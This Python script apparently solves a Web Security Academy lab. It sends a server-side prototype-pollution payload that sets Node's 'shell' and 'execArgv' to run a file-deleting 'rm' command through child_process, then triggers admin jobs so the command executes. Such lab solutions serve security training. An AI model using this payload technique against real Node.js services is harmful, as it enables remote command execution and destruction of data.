from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter", with_json=True)

    payload = {
        "sessionId": session.cookies["session"],
        "__proto__": {
            "shell": "node",
            "execArgv": [
                "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
            ],
        },
    }
    logger.info('POSTing the following JSON to "/my-account/change-address":')
    logger.info(payload)
    session.post_path("/my-account/change-address", json=payload)

    logger.info("Running maintenance jobs from admin panel...")
    session.post_path(
        "/admin/jobs",
        json={
            "csrf": session.get_csrf_token("/admin"),
            "sessionId": session.cookies["session"],
            "tasks": ["db-cleanup", "fs-cleanup"],
        },
    )
